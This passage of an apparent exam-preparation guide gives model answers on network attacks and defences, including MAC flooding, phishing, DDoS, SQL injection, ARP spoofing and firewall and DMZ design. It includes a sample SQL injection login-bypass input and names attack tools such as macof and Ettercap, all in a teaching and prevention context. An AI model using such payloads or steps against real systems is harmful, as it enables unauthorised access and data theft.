   - Port security on access ports, limiting the number of MAC addresses learned per port, which is the direct defence against the starvation flood, since it depends on many MAC addresses appearing on one port.
   - DHCP snooping, which marks ports as trusted or untrusted and drops DHCPOFFER and DHCPACK messages arriving on untrusted ports, so a rogue server cannot answer. It also rate limits DHCP messages per port and builds the binding table.
   - Dynamic ARP Inspection, which uses that binding table to reject forged ARP as well.
   - 802.1X port based authentication, so an unauthorised device never reaches the network.
   - Monitoring the size of the free address pool and alerting on a sudden fall, and reducing the lease time so that stolen addresses return quickly.
20. **What is MAC flooding attack? What is the impact of this switch?** *[BDCCL Assistant Manager (Cyber Security) 14.10.2022 compact it 753 (ET: N/A)]*


   Answer:

   What a MAC flooding attack is:
   - MAC flooding is an attack in which the attacker sends a very large number of frames with different forged source MAC addresses in order to fill the switch's MAC address table, also known as the CAM table.
   - The table has a finite size. Once it is full, the switch can no longer learn any new address, and legitimate entries that age out cannot be relearned.
   - The tool normally used is macof from the dsniff suite, which can generate hundreds of thousands of forged addresses per minute.

   Impact on the switch:
   - The switch degrades into a hub. Because it cannot find the destination address in its table, it must flood every frame out of every port in the VLAN.
   - Loss of confidentiality: the attacker, and in fact every device on the segment, now receives a copy of traffic intended for others, which can be captured with a packet sniffer. Any credential or data sent over an unencrypted protocol is exposed.
   - Loss of performance: the available bandwidth on every port is consumed by traffic that does not belong there, and collisions and congestion rise sharply.
   - Exhaustion of switch resources: CPU and memory are consumed by processing the flood, so the switch may become slow, unmanageable through its console, or crash entirely, which is a denial of service.
   - Loss of the security benefit of switching: the entire reason for replacing hubs with switches, namely that a frame goes only where it is needed, is defeated.
   - It is usually a stepping stone: the visibility it provides is used for session hijacking, credential harvesting or establishing a man in the middle position.

   Prevention:
   - Port security, limiting the number of MAC addresses per access port with a violation action of shutdown or restrict; this is the primary defence.
   - 802.1X authentication before any traffic is permitted.
   - VLAN segmentation to limit how far the flooding reaches.
   - Disabling unused ports, storm control, and monitoring for a rapid rise in MAC table entries.
   - Encryption of all sensitive traffic, so that successful capture yields nothing usable.
21. **(b) Distinguish between phishing and pharming. Give examples to explain.** *[BPSC Sub-Assistant Engineer (Ministry of Agriculture) 2021 compact it 801 (ET: N/A)]*


   Answer:

   | Point | Phishing | Pharming |
   |---|---|---|
   | Method | The victim is lured by a deceptive message into clicking a link | The victim is redirected automatically, without clicking anything |
   | Attack vector | Email, SMS, telephone or social media | DNS cache poisoning, a compromised DNS server, a modified `hosts` file, or a compromised router |
   | User action required | Yes; the victim must open the message and follow the link | No; the victim types the correct address and is still sent to the fake site |
   | Scale | One message reaches one recipient at a time, though sent in bulk | One poisoned DNS entry redirects every user of that resolver at once |
   | Detection by the user | Possible: a suspicious sender, poor language, a wrong URL | Very difficult: the address bar shows the correct domain |
   | Layer attacked | The human being | The name resolution infrastructure |
   | Difficulty for the attacker | Low | Higher; it requires compromising DNS or the router |
   | Primary defence | Awareness, email authentication with SPF, DKIM and DMARC, and multi-factor authentication | DNSSEC, DNS over HTTPS, patched and hardened DNS servers, and secured routers |
   | Common defence to both | HTTPS with strict certificate validation, since a counterfeit site cannot present a valid certificate for the real domain | The same |

   Examples:
   - Phishing: a customer receives an email that appears to come from her bank, saying her account will be suspended unless she verifies it, with a link to `www.bank-verify-online.com`. She clicks, sees a copy of the real login page, and types her credentials, which the attacker captures. Here she was persuaded to go to the wrong place.
   - Pharming: the same customer types `www.bank.com` correctly into her browser. Her ISP's DNS resolver has been poisoned, so the name resolves to the attacker's server. The counterfeit page appears at what looks like the correct address, and she has made no mistake at all. Here she was taken to the wrong place without her participation.
   - A common local variant: malware or a compromised home router changes the DNS setting so that a small number of banking domains resolve to an attacker's server, while everything else works normally.

   - The essential distinction: phishing deceives the person, and pharming deceives the machine. Pharming is more dangerous because the usual advice, to check the address before typing credentials, does not help, and only certificate validation reveals the deception.
22. **What is DDoS and SQL Injection attack?** *[Sonali Bank Ltd. Officer IT 2021 compact it 909 (ET: N/A)]*


   Answer:

   DDoS attack:

   - A Denial of Service attack aims to make a service unavailable to its legitimate users, by exhausting some finite resource: bandwidth, connection table entries, CPU, memory or application threads. It does not steal data; it destroys availability, which is one third of the CIA triad.
   - A Distributed Denial of Service attack is the same thing launched simultaneously from many compromised machines, called a botnet, which may number in the hundreds of thousands and be spread across the world.

   | Point | DoS | DDoS |
   |---|---|---|
   | Source | A single machine and a single IP address | Thousands of machines and IP addresses |
   | Traffic volume | Limited by the attacker's own connection | Can reach terabits per second |
   | Detection | Comparatively easy; the pattern comes from one source | Very difficult; each source looks like an ordinary user |
   | Mitigation | Block the offending IP address | Blocking individual addresses is useless; scrubbing services and rate limiting are required |
   | Tracing the attacker | Possible | Very hard, since the real attacker only commands the botnet |
   | Impact | Moderate | Severe; it can remove a large service entirely |

   Types of attack:
   - Volumetric: UDP flood, ICMP flood and amplification attacks using DNS, NTP or memcached, in which a small forged request produces a very large reply directed at the victim.
   - Protocol attacks: SYN flood, which fills the connection table with half open connections; ping of death; Smurf attack.
   - Application layer attacks: HTTP flood, Slowloris, which holds connections open with partial requests, and expensive database queries repeated endlessly. These use very little bandwidth and are the hardest to detect.

   Mitigation:
   - Rate limiting and connection limits, SYN cookies, and traffic filtering at the edge.
   - A Web Application Firewall and an Intrusion Prevention System.
   - A DDoS scrubbing service or CDN such as Cloudflare or Akamai, which absorbs and filters the traffic before it reaches the origin.
   - Anycast, which spreads the traffic across many sites.
   - Over-provisioned bandwidth, autoscaling and load balancing.
   - Blackhole and sinkhole routing, and coordination with the upstream ISP, which is essential because a volumetric attack must be stopped upstream of the victim's own link.
   - Monitoring with alert thresholds and a rehearsed incident response plan.

   SQL injection attack:
   - SQL injection is an attack in which the attacker inserts malicious SQL code through an application input field, so that the code is executed by the database as though it were part of the intended query.
   - Root cause: the application builds a query by concatenating user input into a string, instead of separating code from data. The database cannot tell which part came from the developer and which from the user.
   - Classic example: a login query written as `SELECT * FROM users WHERE username = '<input>' AND password = '<input>'`. If the user types `' OR '1'='1` as the username, the query becomes `... WHERE username = '' OR '1'='1' AND ...`, whose condition is always true, so the attacker logs in without any password.
   - Types: in-band, where the result is returned directly; error based, which uses database error messages to learn the schema; union based, which appends a UNION SELECT to extract data from other tables; blind injection, which infers data one bit at a time from whether the page behaves differently; and time based blind injection, which uses a deliberate delay as the signal.
   - Impact: authentication bypass, reading the entire database including passwords and personal data, altering or deleting records, and in some configurations executing operating system commands and taking over the server. It has been the cause of many of the largest data breaches.
   - Prevention:
   - Parameterised queries, that is prepared statements with bound parameters, which is the definitive fix, because the input can never be interpreted as code.
   - Stored procedures, provided they too avoid dynamic SQL built from input.
   - Input validation and whitelisting, and escaping as a secondary measure only.
   - Least privilege for the database account, so the application cannot drop tables or read system catalogues.
   - Generic error messages, so that database errors are not returned to the user.
   - A Web Application Firewall as a compensating control, and regular code review and penetration testing.
23. **Phishing attack এর মাধ্যমে কীভাবে attack করা হয়। উহার কারণে কি ক্ষতি হতে পারে?** *[NESCO Junior Assistant Manager (ICT) 2021 compact it 913 (ET: BUET)]*


   Answer:

   How a phishing attack is carried out:
   - Step 1, reconnaissance: the attacker gathers information about the target organisation or individual from the website, social media and previous data leaks, so that the message will be plausible.
   - Step 2, preparation: he registers a domain closely resembling the genuine one, for example replacing a letter or adding a word, obtains a TLS certificate for it so that the padlock appears, and copies the real login page exactly.
   - Step 3, delivery: he sends the message by email, SMS, WhatsApp, telephone or social media, spoofing the sender address to look like the bank, the mobile financial service, the courier or the IT department.
   - Step 4, the pretext: the message creates urgency or fear — "your account will be suspended", "an unauthorised transaction has been detected", "your parcel could not be delivered", "your salary statement is attached" — so that the victim acts before thinking.
   - Step 5, the hook: the victim clicks the link, sees the counterfeit page and enters the username, password, PIN, OTP or card details, which are captured immediately. Alternatively an attached document runs a macro that installs malware.
   - Step 6, exploitation: the attacker uses the credentials at once, often within minutes, before the OTP expires. In a real time proxy attack the fake page relays the credentials to the genuine site live and captures the OTP as it is entered.
   - Step 7, expansion: the compromised account is used to send further phishing to colleagues and contacts, which is far more convincing because it comes from a genuine address.

   Damage that can result:
   - Direct financial loss: money transferred out of the bank account or mobile wallet, fraudulent card transactions, and fraudulent loan applications in the victim's name.
   - Credential theft leading to account takeover of email, banking, social media and corporate systems.
   - Malware and ransomware installed from the attachment, encrypting the organisation's data and halting operations entirely.
   - A foothold in the corporate network from which the attacker moves laterally, escalates privileges and reaches the core systems. Most large breaches begin with a single phishing email.
   - Data breach: theft of customer records and personal data, with regulatory penalties and mandatory disclosure.
   - Business Email Compromise: a forged instruction from a supposed executive or supplier causing a large payment to be made to the attacker's account.
   - Identity theft, with the victim's documents used to open accounts and take loans.
   - Reputational damage and loss of customer trust, which for a bank is the most lasting harm.
   - Operational disruption and the cost of investigation, remediation and legal action.
   - Personal consequences for the victim: financial hardship, and blame or disciplinary action at work.

   Prevention:
   - Awareness training and simulated phishing, multi-factor authentication and preferably phishing resistant factors such as FIDO2 keys, SPF, DKIM and DMARC, URL and DNS filtering, verification of any payment instruction through an independent channel, prompt patching, least privilege, and a reporting culture in which a user who clicks reports it immediately.
24. **Explain ARP Spoofing attack with diagram. Why ARP spoofing attacker used to launch Man-in-the-Middle attack.** *[SGFL Assistant General Engineer 2021 compact it 936 (ET: BUET)]*


   Answer: ARP spoofing is an attack in which the attacker sends forged ARP replies on a local network so that his own MAC address becomes associated with another host's IP address, typically that of the default gateway.

   - ARP has no authentication at all. A host accepts any ARP reply it receives and updates its cache accordingly, even if it never sent a request. This is the flaw the attack exploits.

   How it works:
   - Step 1: the attacker connects to the same LAN segment as the victim.
   - Step 2: the attacker sends a forged ARP reply to the victim saying "the gateway's IP address is at my MAC address".
   - Step 3: the attacker sends another forged ARP reply to the gateway saying "the victim's IP address is at my MAC address".
   - Step 4: both update their ARP caches. From that moment every packet between the victim and the gateway passes through the attacker's machine.
   - Step 5: the attacker enables IP forwarding so the traffic still reaches its destination and nothing appears wrong, while he reads, records or alters it. This is a Man in the Middle position.
   - The forged replies are sent repeatedly, so that the poisoned entry is refreshed before the legitimate one can replace it.

   ```
   Normal:    Victim <---------------> Gateway <---> Internet

   Poisoned:  Victim <---> Attacker <---> Gateway <---> Internet
              (victim believes the attacker is the gateway,
               and the gateway believes the attacker is the victim)
   ```

   What the attacker can then do: capture credentials sent over unencrypted protocols, hijack sessions by stealing cookies, perform SSL stripping to downgrade HTTPS, inject content into pages, or simply drop the traffic to cause a denial of service.

   Prevention:
   - Dynamic ARP Inspection on managed switches, which validates every ARP packet against the DHCP snooping binding table and drops forged ones. This is the primary defence.
   - DHCP snooping, which builds that trusted table of IP to MAC to port bindings.
   - Port security, limiting the number of MAC addresses learned on a port.
   - Static ARP entries for critical hosts such as the gateway and servers, though this does not scale.
   - Encryption everywhere: HTTPS, SSH and VPN, so that even a successful interception yields nothing readable.
   - Network segmentation with VLANs, which limits how far an attacker can reach.
   - ARP monitoring tools such as arpwatch, which alert when an IP to MAC mapping changes unexpectedly.
   - 802.1X port based authentication, so that an unauthorised device cannot join the LAN at all.

   Why an ARP spoofing attacker uses it to launch a Man in the Middle attack:
   - It places the attacker directly in the traffic path. Once both the victim and the gateway have poisoned cache entries, every packet between them physically passes through the attacker's machine, which is precisely the position a Man in the Middle attack requires.
   - It is silent and requires no compromise of either endpoint. Nothing is installed on the victim, no password is needed, and the victim's machine behaves entirely normally, so the attack is invisible to the user.
   - With IP forwarding enabled the traffic continues to reach its destination, so there is no loss of service to arouse suspicion. Without forwarding the same technique becomes a denial of service instead.
   - It requires only access to the same LAN segment, which an insider, a contractor, a guest on the office Wi-Fi or anyone who can reach an unused network port already has.
   - It gives complete read and write access to the traffic, which enables the full range of follow-on attacks: capturing credentials sent over unencrypted protocols, stealing session cookies to hijack an authenticated session, SSL stripping to downgrade HTTPS to HTTP, injecting malicious content into pages, and redirecting the victim by supplying false DNS answers.
   - ARP has no authentication whatsoever and no mechanism for verifying an unsolicited reply, so the attack needs no vulnerability to be discovered or exploited; it uses the protocol exactly as designed.
   - The tools are freely available and require little skill: Ettercap, Cain and Abel, arpspoof and Bettercap all automate it.

   - Defence in one line: prevent the position with Dynamic ARP Inspection, DHCP snooping and 802.1X, and make the position worthless with end to end encryption and strict certificate validation.
25. **Difference between spoofing and sniffing** *[Combined 4 Banks Assistant Programmer 2020 compact it 1002 (ET: DU)]*


   Answer:

   | Point | Spoofing | Sniffing |
   |---|---|---|
   | Nature | An active attack: the attacker forges an identity | A passive attack: the attacker only listens |
   | Action | Pretending to be another host, user or device | Capturing and reading traffic that passes by |
   | Data altered | Yes, the source information is falsified | No, nothing is changed |
   | Goal | To gain unauthorised access or to redirect traffic | To obtain confidential information such as credentials |
   | Detection | Comparatively easier, since forged packets can be spotted | Very difficult, because there is no trace at all |
   | Traces left | Yes, in logs and in caches | Essentially none |
   | Types | IP spoofing, MAC spoofing, ARP spoofing, DNS spoofing, email spoofing, caller ID spoofing | Passive sniffing on a hub or a monitor port, and active sniffing on a switch after MAC flooding or ARP spoofing |
   | Tools | Ettercap, hping3, Scapy | Wireshark, tcpdump, dsniff |
   | Prevention | Authentication, digital signatures, ingress and egress filtering, DAI, DHCP snooping, DNSSEC, SPF, DKIM and DMARC | Encryption of all traffic with TLS, SSH and VPN; switched networks; port security; VLAN segmentation |
   | Effect on the victim | May lose data, money or control | Loses confidentiality without knowing it |

   - Relationship between the two: they are commonly combined. On a switched network an attacker cannot simply sniff, because the switch sends each frame only to the correct port. So he first spoofs — ARP spoofing or MAC flooding — to obtain a position in the traffic path, and then sniffs. Spoofing is the means of access and sniffing is the objective.
   - The single most effective defence against sniffing is encryption, because captured ciphertext is worthless; the most effective defence against spoofing is authentication, because a forged identity then fails verification.
26. **Which security attacks (given) occur on client side or server side?** *[Microcredit Regulatory Authority Assistant Maintenance Engineer 2020 compact it 1033 (ET: BUET)]*


   Answer: Attacks are classified by where the vulnerability being exploited actually resides.

   Client side attacks:
   - These exploit weaknesses in the user's browser, operating system or applications, or in the user personally. The attacker's target is the victim's own machine.
   - Cross Site Scripting, XSS: the injected script executes in another user's browser, so although the flaw is in the server's output handling, the victim and the execution are on the client.
   - Cross Site Request Forgery, CSRF: the victim's browser is tricked into sending an authenticated request.
   - Clickjacking, in which an invisible frame overlays a legitimate page.
   - Drive-by download and malicious advertising, which install malware when a page is merely viewed.
   - Browser and plug-in exploits, and malicious browser extensions.
   - Phishing, social engineering and malicious email attachments.
   - Keyloggers, spyware and ransomware on the endpoint.
   - Session hijacking through a stolen cookie, and man in the browser malware.

   Server side attacks:
   - These exploit weaknesses in the server's software, configuration or infrastructure. The attacker's target is the server itself.
   - SQL injection and other injection flaws such as command injection and LDAP injection.
   - Remote code execution and buffer overflow in server software.
   - Directory traversal and local or remote file inclusion.
   - Server misconfiguration, default credentials and exposed administrative interfaces.
   - Broken authentication and broken access control on the server.
   - Denial of Service and Distributed Denial of Service against the server or its link.
   - Server Side Request Forgery, in which the server is tricked into making requests on the attacker's behalf.
   - XML External Entity injection, and insecure deserialisation.
   - Privilege escalation on the host, and exploitation of unpatched services.

   Attacks affecting both, or the network in between:
   - Man in the Middle, ARP spoofing, DNS poisoning and SSL stripping, which attack the path rather than either endpoint.
   - Password attacks, which may target either the client's stored credentials or the server's authentication service.
   - Supply chain attacks, which compromise a component used by both.

   - The practical significance of the distinction: the defences differ completely. Server side flaws are fixed by secure coding, patching, hardening, input validation with parameterised queries and a Web Application Firewall. Client side flaws are addressed by output encoding and a Content Security Policy on the server, together with browser updates, endpoint protection and user awareness on the client. An organisation that secures only one side remains fully exposed through the other.

## Firewalls & Network Defense (16)

1. **As a cybersecurity analyst at a nuclear power plant, what IDS strategies and steps are required to prevent cyberattacks?** *[NPCBL Sub Assistant Engineer: Cyber Security Analyst Date: 11 July 2026 (ET: N/A)]*


   Answer: A nuclear power plant is critical national infrastructure with an Operational Technology network controlling physical processes, so the intrusion detection strategy must protect safety and availability above all, and must never itself interfere with the control system.

   Architecture and placement of IDS:
   - Segment the network into zones and conduits following IEC 62443: the corporate IT network, a demilitarised zone, the supervisory SCADA network, the control network and the safety instrumented system, with firewalls between each level, which is the Purdue model.
   - Deploy a network IDS at every zone boundary, particularly between IT and OT, which is the path an attacker must cross.
   - Use passive monitoring through SPAN ports or network taps in the OT zone, so that the IDS can never inject traffic or delay a control packet. Detection, not prevention, is used inside the control network; an IPS that blocks a legitimate control command could itself cause a plant trip.
   - Enforce a unidirectional gateway, that is a data diode, from OT to IT, so data can leave the control network for monitoring but nothing can enter.
   - Deploy host based IDS on engineering workstations, historians and HMI servers, with file integrity monitoring.
   - Never connect the safety instrumented system to any routable network.

   Detection strategies:
   - Signature based detection for known malware and known ICS attack tools, using rule sets specific to industrial protocols, for example Snort or Suricata with ICS rules.
   - Anomaly and behaviour based detection, which is far more valuable in OT than in IT: a control network's traffic is highly repetitive and predictable, so a baseline can be established very accurately and any deviation is meaningful.
   - Protocol aware deep packet inspection for Modbus, DNP3, IEC 61850, OPC UA and Profinet, checking that commands are within valid ranges and come from authorised sources. A command to open a valve from an unexpected host is detectable even if the packet is well formed.
   - Asset discovery and inventory, passive rather than active, since active scanning can crash fragile PLCs.
   - Physical process anomaly detection: correlate network commands with sensor readings, so that an attack which forges normal readings while altering the process, as Stuxnet did, is detected.
   - Threat intelligence feeds specific to ICS, and rules for known ICS malware families such as Stuxnet, Industroyer, Triton and Pipedream.

   Steps required to prevent cyber attacks:
   - Governance: an information security management system, ICS specific risk assessment, and compliance with IEC 62443, NIST SP 800-82 and the IAEA nuclear security guidance.
   - Defence in depth: layered controls so that no single failure exposes the plant.
   - Network segmentation and strict firewall rules with default deny, and removal of any direct Internet connectivity from OT.
   - Strict access control: least privilege, role based access, multi-factor authentication for all remote and administrative access, and privileged access management with session recording.
   - Removable media control: USB ports disabled or whitelisted, and a scanning kiosk for any media that must enter, since Stuxnet entered by USB.
   - Vendor and remote access: no permanent remote access; time limited, supervised, logged sessions only.
   - Patch management adapted to OT: patches tested on a replica system first and applied in planned outage windows, with compensating controls such as virtual patching at the IDS in the meantime.
   - Application whitelisting on HMI and engineering workstations, since the software set is small and stable.
   - Continuous monitoring: a security operations centre with OT expertise, centralised logging and a SIEM correlating IT and OT events 24 hours a day.
   - Incident response plan specific to OT, rehearsed with the operations team, with clear criteria for when to disconnect and when a safe shutdown is required.
   - Backup and recovery: offline, immutable backups of PLC programs, HMI configurations and engineering files, with tested restoration.
   - Supply chain security: vetting of vendors, verification of firmware signatures, and secure procurement requirements.
   - Physical security integrated with cyber security, since physical access defeats every network control.
   - Personnel: background checks, insider threat programme, separation of duties, and regular training for both IT and operations staff.
   - Regular assessment: vulnerability assessment on a test bed rather than the live plant, red team exercises, and independent audit.

   - The governing principle to state: in a nuclear plant the priority order is safety, then availability, then integrity, then confidentiality, which is the reverse of ordinary IT. Every security control must be judged first by whether it could itself cause an unsafe condition.
2. **What is Packet Filter of Firewall?** *[National Legal Aid Services Organization Assistant Maintenance Engineer 18.10.2025 compact it 1450 (ET: N/A)]*


   Answer: A packet filtering firewall is the simplest type of firewall. It examines each packet individually and decides to permit or deny it by comparing the header fields against a set of rules called an access control list.

   Fields examined:
   - Source IP address and destination IP address.
   - Source port and destination port.
   - Protocol, that is TCP, UDP or ICMP.
   - The interface on which the packet arrived, and sometimes the TCP flags.

   How it works:
   - The rules are evaluated in order, from top to bottom, and the first match determines the action: permit or deny.
   - A default deny rule at the end blocks anything not explicitly permitted, which is the correct and secure configuration.
   - Example rules: permit TCP from any source to 203.0.113.10 on port 443; deny all traffic from a particular subnet; permit UDP to port 53 from the internal DNS resolver only.

   Characteristics:
   - It is stateless: each packet is judged entirely on its own, with no memory of the connection it belongs to. This is its defining limitation.
   - It works at layers 3 and 4 of the OSI model.

   Advantages:
   - Very fast, since only the header is read, and it therefore adds almost no latency.
   - Simple, cheap and available on almost every router.
   - Transparent to users and applications, and effective at coarse blocking such as closing whole ports or subnets.

   Disadvantages:
   - No knowledge of connection state, so it cannot tell a legitimate reply from an unsolicited packet with the right port numbers. This means the return traffic of every permitted connection must be allowed by a separate rule, which widens the opening considerably.
   - Cannot inspect the payload, so it cannot detect malware, SQL injection or any application layer attack. Malicious traffic on an allowed port passes freely.
   - Vulnerable to IP spoofing and to fragmentation attacks.
   - No user authentication and no logging of session context.
   - The rule set becomes large and difficult to maintain, and rule ordering errors are a common source of unintended exposure.

   - This is why stateful inspection firewalls replaced packet filters as the standard, and why next generation firewalls added application and user awareness on top of that. Packet filtering survives as the first, cheapest layer of a defence in depth design.
3. **Write down the difference between Next-Generation Firewall (NGFW) and Web Application Firewall (WAF)?** *[Islami Bank PLC Senior Officer (Network/System) 14.03.2025 compact it 1331 (ET: BUET)]*

| NGFW | WAF |
|---|---|
| নেটওয়ার্ক-ভিত্তিক সুরক্ষা | ওয়েব অ্যাপ্লিকেশন সুরক্ষা |
| Layer 3, 4, 7 | Layer 7 |
| Network-based Attacks (DDoS, Malware, IPS) | Web-based Attacks (SQL Injection, XSS, CSRF) |
| Palo Alto, Fortinet, Cisco Firepower | Cloudflare WAF, AWS WAF, Imperva WAF |


   Answer:

   | Point | NGFW, Next Generation Firewall | WAF, Web Application Firewall |
   |---|---|---|
   | Protects | The network as a whole, and all the hosts behind it | One specific web application or a group of them |
   | OSI layers | 3, 4 and 7 | 7 only, and specifically HTTP and HTTPS |
   | Scope of traffic | All protocols and all ports | Only HTTP and HTTPS requests and responses |
   | Attacks blocked | Network and transport attacks: malware, botnets, port scans, intrusion attempts, unauthorised applications, DDoS at the network level | Application attacks: SQL injection, cross site scripting, CSRF, file inclusion, session hijacking, credential stuffing, OWASP Top 10 |
   | Placement | At the network perimeter, between zones, and at the Internet edge | Directly in front of the web server, as a reverse proxy or as a module |
   | Awareness | Application identity, user identity, and threat intelligence | The structure and semantics of the HTTP request: parameters, headers, cookies, body |
   | Method | Stateful inspection with deep packet inspection, integrated IPS and TLS decryption | Signature rules plus a positive security model, that is a learned profile of normal requests |
   | Typical products | Palo Alto, Fortinet FortiGate, Cisco Firepower, Check Point | Cloudflare WAF, AWS WAF, Imperva, F5 ASM, ModSecurity |
   | What it cannot do | It cannot understand the logic of a web application, so it will not reliably catch a well crafted SQL injection | It cannot protect anything that is not a web application, and it sees no other protocol |

   - The two are complementary, not alternatives. A bank uses an NGFW at the perimeter to control what may reach the network at all, and a WAF in front of the internet banking application to protect the application logic itself. Neither replaces the other: an NGFW will not stop SQL injection reaching a vulnerable page, and a WAF will not stop a network intrusion or malware on a workstation.
   - Both should be treated as compensating controls rather than fixes: the correct remedy for SQL injection is parameterised queries in the code, and the WAF is the safety net while the code is being fixed.
4. **Bangladesh Bank have client server and the communication with Mail Server, DNS server, Web server. Bangladesh Bank want to ensure the security using firewall on those server. Draw a diagram with the scenario.** *[Bangladesh Bank Assistant Director (ICT) 07.02.2025 compact it 1323 (ET: DU)]*


   Answer: The design places the publicly reachable servers in a DMZ and protects the internal client-server systems behind a second firewall, so that a compromise of any public service cannot reach the core banking network.

   ```mermaid
   graph TD
       A["Internet"] --> B["Router / Edge"]
       B --> C["External Firewall / NGFW"]
       C --> D["DMZ"]
       D --> E["Web Server: HTTPS 443"]
       D --> F["Mail Server: SMTP 25, 587"]
       D --> G["DNS Server: 53"]
       C --> H["Internal Firewall"]
       H --> I["Internal LAN: Bangladesh Bank clients"]
       H --> J["Application Server"]
       J --> K["Database Server: restricted zone"]
       C -.->|"denied"| I
       D -.->|"only specific ports"| J
   ```

   Rules that make the design work:
   - External firewall: permit from the Internet only TCP 443 to the web server, TCP 25 and 587 to the mail server, and UDP and TCP 53 to the DNS server. Deny everything else inbound by default.
   - No direct path from the Internet to the internal LAN or to the database. Any such rule defeats the whole design.
   - Internal firewall: permit only the specific flows required, for example the web server to the application server on one port, and the application server to the database on one port. Default deny in both directions.
   - DMZ to internal traffic is initiated only where unavoidable, is restricted to named hosts and ports, and is logged.
   - Internal clients reach the Internet through a proxy in the DMZ, not directly.
   - Management traffic uses a separate out of band network, reachable only from a jump host with multi-factor authentication.

   Additional controls appropriate to a central bank:
   - A Web Application Firewall in front of the web server, and mail filtering with SPF, DKIM and DMARC on the mail server.
   - An intrusion detection and prevention system monitoring both the DMZ and the internal boundary.
   - DNS split horizon: an external DNS server in the DMZ answering only public records, and a separate internal DNS server for internal names.
   - Network segmentation of the internal LAN itself, with the database in its own protected zone.
   - Centralised logging to a SIEM, and 24 hour monitoring.
   - TLS everywhere, encryption of data at rest, and regular patching and vulnerability assessment.

   - The principle to state: defence in depth with a screened subnet. The public servers are sacrificial; they are exposed by necessity, so they are isolated, hardened and monitored, and the second firewall ensures that their compromise is contained rather than fatal.
5. **What is Demilitarized Zone (DMZ) and sandbox for security test?** *[PGCB Assistant Engineer (CSE) 17.05.2024 compact it 398 (ET: BUET)]*


   Answer:

   Demilitarized Zone, DMZ:
   - A DMZ is a separate network segment placed between the untrusted Internet and the trusted internal network, in which the servers that must be reachable from outside are located.
   - Its purpose is containment: a public facing server is the most likely thing to be compromised, so it is deliberately kept outside the internal network, and a second firewall stands between it and the internal systems. If the web server is taken over, the attacker has still gained nothing but a foothold in an isolated segment.
   - Typical DMZ hosts: web server, mail server, DNS server, FTP server, reverse proxy and VPN concentrator.
   - Two designs: a single firewall with three interfaces, that is Internet, DMZ and LAN; and the stronger dual firewall or screened subnet design, in which two separate firewalls, preferably from different vendors, stand on either side of the DMZ.

   ```mermaid
   graph LR
       A["Internet"] --> B["External Firewall"]
       B --> C["DMZ: Web server, Mail server, DNS server, Proxy"]
       C --> D["Internal Firewall"]
       D --> E["Internal LAN: workstations, database, file server"]
       B -.->|"blocked"| E
   ```

   - The design principle: a service that must be reachable from the Internet is placed in the DMZ, never on the internal LAN. If a public server is compromised, the attacker is still separated from the internal network by the second firewall, so the damage is contained. Traffic from the DMZ to the internal LAN is denied by default and permitted only for specific, tightly controlled flows, for example the web server reaching one database port.

   Sandbox for security testing:
   - A sandbox is an isolated environment in which untrusted code, a suspicious file or a new application can be executed and observed without any risk to the real system, because it has no access to the host's file system, network or other processes.
   - How it is used in security: a suspicious email attachment or download is detonated in the sandbox, and its behaviour is recorded — which files it writes, which registry keys it changes, which network connections it attempts, whether it tries to encrypt files or to escalate privileges. If it behaves maliciously it is blocked, even though no signature for it existed. This is how unknown and zero day malware is caught.
   - Other uses: safely analysing malware in a reverse engineering laboratory; running browser tabs and mobile applications in isolation, which is standard in Chrome, Android and iOS; testing patches and untrusted software before deployment; and providing a safe environment for penetration testing and for training.
   - Implementations: virtual machines, containers, dedicated appliances such as FireEye and Palo Alto WildFire, and cloud services such as Any.run and Hybrid Analysis.
   - Limitation worth stating: sophisticated malware detects that it is in a sandbox — by checking for virtualisation artefacts, a small disk, no user activity or a short uptime — and stays dormant, so sandboxing must be combined with behavioural monitoring on the real endpoint.
6. **Different types of network firewalls. Explain NGFW compared to traditional firewall.** *[Combined Bank Assistant Maintenance Engineer/ Assistant Engineer (IT) 24.02.2024 compact it 301 (ET: BIBM)]*


   Answer:

   Types of firewall:
   - Packet filtering firewall: examines each packet's source and destination IP address, port and protocol against an access control list. It is stateless, very fast and cheap, but it has no memory of context, so it can be defeated by fragmented or spoofed packets and cannot understand a session.
   - Stateful inspection firewall: maintains a connection table and permits a packet only if it belongs to a legitimate established session. It is far more secure than packet filtering and is the standard type today.
   - Circuit level gateway: works at the session layer, verifying the TCP handshake before allowing the session to proceed, but it does not inspect the content of the traffic.
   - Application level gateway, that is a proxy firewall: terminates the connection and rebuilds it, inspecting the full application content such as an HTTP request. Very secure, but slower, and a separate proxy is needed for each protocol.
   - Next Generation Firewall, NGFW: combines stateful inspection with deep packet inspection, application awareness, user identity, integrated intrusion prevention, TLS inspection and cloud threat intelligence.
   - Web Application Firewall, WAF: protects a web application specifically against SQL injection, cross site scripting and similar attacks by inspecting HTTP requests.
   - By deployment: hardware appliance, software or host based firewall such as Windows Defender Firewall and iptables, and cloud firewall or firewall as a service.

   NGFW compared with a traditional firewall:

   | Point | Traditional firewall | Next Generation Firewall |
   |---|---|---|
   | Inspection depth | Header only, that is IP, port and protocol | Deep packet inspection of the payload as well |
   | OSI layers covered | 3 and 4 | 3 to 7, including the application layer |
   | Application awareness | None; it sees only port 443 | Identifies the actual application, so Facebook and Dropbox on the same port 443 are distinguished |
   | User awareness | None; it sees only IP addresses | Integrates with Active Directory or LDAP, so policy can be written per user or group |
   | Threat prevention | None built in | Integrated IPS, antivirus, anti-bot and sandboxing |
   | Encrypted traffic | Cannot inspect it | TLS inspection: decrypt, inspect and re-encrypt |
   | Threat intelligence | None | Cloud feeds of known malicious addresses, domains and file hashes, updated continuously |
   | Policy style | Allow port 443 from this subnet | Allow the Finance group to use Salesforce but not file sharing |
   | Performance cost | Very low | High, so far more processing power is required |
   | Cost and complexity | Low | High, with subscription licences for the security services |

   - In short, a traditional firewall asks where the packet is going, while an NGFW asks who is sending it, what application it is, and whether it is carrying an attack.
7. **What is Firewall? Discuss about different types of Firewall.** *[Sonali & Janata Bank Officer (IT) 14.10.2023 compact it 528 (ET: MIST)]*


   Answer:

   What a firewall is:
   - A firewall is a network security device or software that monitors incoming and outgoing traffic and permits or blocks it according to a defined security policy. It stands between a trusted internal network and an untrusted external one, and it is the primary mechanism for controlling what may cross that boundary.
   - Its default policy should be deny all, permit by exception, so that anything not explicitly allowed is blocked.

   Why it is used:
   - To block unauthorised access from outside and to prevent unauthorised traffic leaving.
   - To enforce the organisation's security policy at a single controllable point.
   - To hide the internal network structure, usually through NAT.
   - To log and monitor traffic, which provides both alerting and evidence.
   - To segment the network so that a compromise in one zone does not spread to another.
   - To provide, in a modern firewall, intrusion prevention, content filtering, application control and VPN termination.

   Types of firewall:
